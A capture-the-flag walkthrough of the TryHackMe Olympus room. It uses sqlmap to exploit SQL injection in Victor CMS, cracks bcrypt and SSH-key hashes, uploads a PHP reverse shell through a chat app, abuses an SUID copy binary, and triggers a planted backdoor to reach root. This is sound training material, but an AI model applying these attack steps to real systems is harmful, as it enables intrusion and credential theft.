---
title: TryHackMe - Olympus
author: r2cook
categories:
  - TryHackMe
tags:
  - Olympus
  - Victor CMS
  - SQLI
  - sqlmap
  - hashid
  - hashcat
  - rsa
  - ssh2john
  - john
  - RCE
  - php-backdoor
  - vhost
  - find
  - regex
render_with_liquid: false
media_subpath: /images/thm/Olympus/
image:
  path: room_image.webp
date: 2026-04-15
---

> In this walkthrough, we compromise the TryHackMe **Olympus** machine by enumerating a **Victor CMS** installation, discovering a **SQL Injection vulnerability**, dumping the database to retrieve user hashes, cracking the **bcrypt password with Hashcat**, abusing the **file upload functionality in a chat application** to gain remote code execution, and finally escalating privileges through a **misconfigured SUID binary** and a **PHP backdoor** to obtain the root flag.

---

# Initial Setup

First, add the target to your hosts file:

```plaintext
10.114.156.16 olympus.thm
```
{: file="/etc/hosts" }

---

# Enumeration

## Full Port Scan

```shell
$ rustscan -a olympus.thm -g  
10.114.156.16 -> [22,80]

$ nmap -sC -sV -Pn -T4 -p 22,80 -oA nmap/scan olympus.thm
```
{: .nolineno }

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-14 20:07 +0200
Nmap scan report for olympus.thm (10.114.156.16)
Host is up (0.069s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

Service Info: OS: Linux
```

From the scan we can see that only **two ports are open**:

- **22 → SSH**
    
- **80 → HTTP**
    

So the main attack surface will likely be the **web service**.

---

# Web Portal (Port 80)

![](web_portal_80.png){: width="800" height="400" .shadow }

At first glance, the web page does not reveal anything interesting.  
There are no obvious login panels or functionality to interact with.

Because of that, I decided to start **directory fuzzing**.

---

```shell
ffuf -u http://olympus.thm/FUZZ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
-e .php,.txt,.sql,.zip,.js,.zip,.bak,.old \
-mc 200,301,302,403 \
-c | tee ffuf_root.txt
```
{: .nolineno }

Result:

```
index.php
javascript
phpmyadmin
server-status
static
~webmaster
```

---

One interesting directory discovered was:

```
/~webmaster
```

Navigating to it reveals a **Victor CMS**.

![](web_portal_80_webmaster_dir.png){: width="800" height="400" .shadow }

---

I tried interacting with the CMS manually, clicking around the site and exploring different pages, but I couldn't find anything immediately useful.

So I decided to search online for **Victor CMS exploit** led me to **Exploit-DB**, where I found two exploits:

**Victor CMS 1.0 SQL Injection**

![](exploit_db_victor_cms_1_0_sqli.png){: width="800" height="400" .shadow }

**Victor CMS 1.0 File Upload → RCE**

![](exploit_db_victor_cms_1_0_file_upload_to_rce.png){: width="800" height="400" .shadow }

However, the second exploit requires **authentication**, meaning we must first obtain valid credentials.

Because of that, I decided to start by testing the **SQL Injection vulnerability**.

---

# SQL Injection

The vulnerable page appears to be:

```
/search.php
```

![](web_portal_80_webmaster_search_dir.png){: width="800" height="400" .shadow }

I captured the request using **Burp Suite**.

![](burp_search_req.png){: width="800" height="400" .shadow }

Then I attempted to inject the payloads.

![](burp_search_req_payload_failed.png){: width="800" height="400" .shadow }

As shown in the response, the query fails.

However, manual testing was not giving reliable results, so I decided to switch to **sqlmap**.

---

First, I copied the request into a file called:

```
req.txt
```

Then I marked the injection point with `*` so **sqlmap** knows where to inject payloads.

![](req_txt.png){: width="800" height="400" .shadow }

---

## Testing Injection with sqlmap

```shell
sqlmap -r req.txt --banner
```
{: .nolineno }

Result:

```
banner: '8.0.41-0ubuntu0.20.04.1'
```

This confirms the injection works.

---

# Database Enumeration

Next, I attempted to enumerate the databases.

```shell
sqlmap -r req.txt --dbs
```
{: .nolineno }

![](sqlmap_dbs_tables.png){: width="800" height="400" .shadow }

The most interesting database is clearly:

```
olympus
```

---

# Enumerating Tables

```shell
sqlmap -r req.txt -D olympus --tables --batch
```
{: .nolineno }

![](sqlmap_olympus_db_tables.png){: width="800" height="400" .shadow }

One table immediately caught my attention:

```
flag
```

---

# Dumping the Flag Table

```shell
sqlmap -r req.txt -D olympus -T flag --dump --batch
```
{: .nolineno }

![](sqlmap_flag_table.png){: width="800" height="400" .shadow }

This gives us the **first flag**.

---

# Dumping Users Table

Next, I examined the `users` table.

![](sqlmap_olympus_db_users_table.png){: width="800" height="400" .shadow }

We can see **three users** listed.

Another interesting observation is that their **email addresses reference a subdomain**:

```
chat.olympus.thm
```

This might indicate the existence of another web application.

So I added it to the hosts file.

```plaintext
10.114.156.16 olympus.thm chat.olympus.thm
```
{: file="/etc/hosts" }

---

# Password Cracking

Now we have password hashes.

To identify the hash type I used **hashid**.

![](hashid.png){: width="800" height="400" .shadow }

The tool suggests the hash type is **bcrypt**.

Hashcat mode for bcrypt is:

```
3200
```

So I saved the hashes into a file called:

```
hashes.txt
```

Then ran:

```shell
hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```
{: .nolineno }

![](hashcat_prometheus_password_cracked.png){: width="800" height="400" .shadow }

Hashcat managed to crack **only one password**, which belongs to:

```
prometheus
```

---

# Logging into Victor CMS

Using the cracked credentials, I attempted to log in.

![](prometheus_login_web_portal.png){: width="800" height="400" .shadow }

The login was **successful**.

![](prometheus_loggedin_success.png){: width="800" height="400" .shadow }

Now that we have access to the admin panel, I attempted to use the **File Upload to RCE exploit**.

![](exploit_db_victor_cms_1_0_file_upload_to_rce.png){: width="800" height="400" .shadow }

---

# Attempting Reverse Shell Upload

I used the classic **php-reverse-shell** from [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

After downloading it, I modified the IP and port to match my attacking machine.

Then I started a listener.

![](nc_listener_9001.png){: width="800" height="400" .shadow }

Next, in the CMS admin panel I navigated to:

```
Profile → Upload Photo
```

![](cms_admin_page_profile_upload_shell.png){: width="800" height="400" .shadow }

I uploaded the reverse shell and clicked **Update User**.

However, for some reason **the file was not uploaded**, and no error messages appeared.

I tried:

- Changing file extensions
    
- Renaming the file
    
- Uploading different variations
    

But nothing worked.

Instead of spending too much time on this, I decided to move forward and explore the **chat subdomain** we discovered earlier.

---

# Chat Application (chat.olympus.thm)

After adding the subdomain to the hosts file, I navigated to:

```text
http://chat.olympus.thm
```

I found a login page.

![](vhost_chat_login_page.png){: width="800" height="400" .shadow }

---

## Login as prometheus

I tried logging in using the credentials we cracked earlier for the user:

```text
prometheus
```

![](vhost_chat_login_page_creds.png){: width="800" height="400" .shadow }

The login was **successful**.

![](chat_prometheus_loggedin_success.png.png){: width="800" height="400" .shadow }

---

After logging in, I noticed that the application is a **chat system**, and it allows users to:

- Send messages
    
- Upload files inside the chat
    

This looks promising, especially because **file upload functionality is often vulnerable**.

---

## File Upload Behavior

While testing the upload feature, I noticed something important:

- The uploaded file name is **changed automatically**
    
- The upload directory is **not directly accessible for listing**
    

So the challenge here is:

 _How can we know the uploaded file name after it gets changed?_

---

## Fuzzing the Chat Application

To find useful endpoints, I ran **ffuf** again on the subdomain.

```shell
$ ffuf -u http://chat.olympus.thm/FUZZ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
-e .php,.txt,.sql,.zip,.js,.zip,.bak,.old \
-mc 200,301,302,403 \
-c | tee ffuf_chat.txt
```
{: .nolineno }

---

### Results

```text
config.php
home.php
index.php
login.php
logout.php
upload.php
uploads
```

---

The most interesting findings were:

```text
/upload.php
/uploads
```

So now we know where uploaded files are stored.

---

# Uploading Reverse Shell

I uploaded the same **php reverse shell** again using the chat upload feature.

![](chat_upload_shell.png){: width="800" height="400" .shadow }

---

## Problem

Now we have two problems:

1. The file name is **randomized**
    
2. The `/uploads` directory does **not list files**
    

![](vhost_uploads_dir_enum.png){: width="800" height="400" .shadow }

---

## Finding Uploaded File Name

After thinking for a while, I remembered something important:

 During database enumeration, we saw a table called:

```text
chats
```

So I decided to check it again.

![](sqlmap_olympus_db_chats_table.png){: width="800" height="400" .shadow }

Inside the table, I found entries containing file names, including my uploaded shell.

At first, I saw **two entries**, because I refreshed the chat page, which caused the message to be sent again (my mistake 😅).

---

If the uploaded file does not appear immediately, we can force `sqlmap` to refresh the results:

```shell
$ sqlmap -r req.txt -D olympus -T chats --dump --batch --fresh-queries
```
{: .nolineno }

The `--fresh-queries` flag forces `sqlmap` to ignore cached session results.

---

## Identifying the Shell

The uploaded file name was:

```text
0ab3d659a4a4752825737f9493547dc1.php
```

---

## Executing the Shell

I navigated to:

```url
http://chat.olympus.thm/uploads/0ab3d659a4a4752825737f9493547dc1.php
```

---

And successfully received a reverse shell.

![](nc_reverse_shell_obtained.png){: width="800" height="400" .shadow }

---

# Post Exploitation

After getting the shell, I stabilized it and started exploring the system.

While navigating through directories, I found a user named:

```text
zeus
```

Inside the home directory, I found:

- `user.txt`
    
- `zeus.txt`
    

![](cd_zues_get_user_flag_read_zues_txt.png){: width="800" height="400" .shadow }

---

# Privilege Escalation

## Finding SUID Binaries

```shell
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```
{: .nolineno }

![](find_suid_as_www_data.png){: width="800" height="400" .shadow }

---

One binary caught my attention:

```text
/usr/bin/cputils
```

Permissions:

```text
-rwsr-xr-x 1 zeus zeus 17728 Apr 18 2022 /usr/bin/cputils
```

---

## Analyzing cputils

The binary belongs to user **zeus**, and since it has the SUID bit set, it runs with **zeus privileges**.

I tried using `man`, but it did not provide useful information.

So I started experimenting with it manually.

---

After some testing, I realized:

 The binary is used to **copy files**

---

## Exploiting cputils

Since it runs as `zeus`, we can use it to copy sensitive files owned by `zeus`.

So I used it to copy the SSH private key:

![](cputils_copy_zeus_ssh_key.png){: width="800" height="400" .shadow }

---

# Cracking SSH Key

After copying the key locally:

```shell
chmod 600 id_rsa
ssh-keygen -yf id_rsa
```
{: .nolineno }

---

The key required a **passphrase**.

So I converted it using `ssh2john`:

```shell
ssh2john id_rsa > hash.txt
```
{: .nolineno }

Then cracked it with John:

```shell
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
{: .nolineno }

![](ssh2john_john_crack_id_rsa.png){: width="800" height="400" .shadow }

---

# SSH Login

Using the cracked key, I logged in:

![](ssh_zues_logged_in_success.png){: width="800" height="400" .shadow }

---

# Further Enumeration

I checked for files writable by the `zeus` group:

```shell
find / -group zeus -perm -u=w 2>/dev/null
```
{: .nolineno }

![](find_by_groups_result_intersting.png){: width="800" height="400" .shadow }

---

I found interesting files inside `/var/www/html/0aB*************` directory :

![](ls_0aB44fdS3eDnLkpsz3deGv8TttR4sc_dir.png){: width="800" height="400" .shadow }

---

# Backdoor Discovery

Inside that directory, I found a suspicious file:

```
VIGQFQFMYOST.php
```

![](php_backdoor_file.png){: width="800" height="400" .shadow }


---

After inspecting the file, it appears to be a **backdoor created by prometheus**.

---

## Understanding the Backdoor

From analyzing the PHP code, the backdoor expects the following URL format:

```text
http://olympus.thm/VIGQFQFMYOST.php?ip=<IP>&port=<PORT>
```

It also requires a password to trigger the shell connection, which is:

```text
a7c5ffcf139742f52a5267c4a0674129
```

When accessing the file, it first prompts for this password, and only after providing it correctly will the reverse shell be executed.

---

I tried to access this backdoor directly through the domain `olympus.thm`, but it was not reachable.

This suggested that the file exists on the system but is **not being served by the web server**, meaning we cannot access it through the normal web service on port 80.

So I assumed that it needs to be **hosted manually** to make it accessible.

Because of that, I decided to use PHP to serve its directory so I can access it through the browser.

---

## Serving the Backdoor

To make the backdoor accessible, I served the directory using PHP:

![](php_serv_backdoor_dir.png){: width="800" height="400" .shadow }

This exposed the file over HTTP on a custom port.

---

## Getting Root Shell

I started a new listener:

![](nc_listener_9002.png){: width="800" height="400" .shadow }

Then triggered the backdoor by visiting it in the browser and providing:
    

![](backdoor_brwoser_send_payloads.png){: width="800" height="400" .shadow }

**NOTE:**  
Since the backdoor was served using PHP on port **8000**, the correct URL to trigger it is:

```text
http://olympus.thm:8000/VIGQFQFMYOST.php?ip=<IP>&port=<PORT>
```

---

Root shell obtained successfully

![](root_shell_obtained.png){: width="800" height="400" .shadow }

---

# Root Flag

Inside `/root`, I found the root flag.

![](root_flag.png){: width="800" height="400" .shadow }

---

The message says:

```text
PS : Prometheus left a hidden flag, try and find it !
(Hint : regex can be useful)
```

---

# Finding Hidden Flag

So I searched the entire system using regex:

```shell
find / -type f 2>/dev/null -exec grep -oP 'flag\{[^}]+\}' {} + 2>/dev/null
```
{: .nolineno }

![](final_hidden_flag.png){: width="800" height="400" .shadow }

---
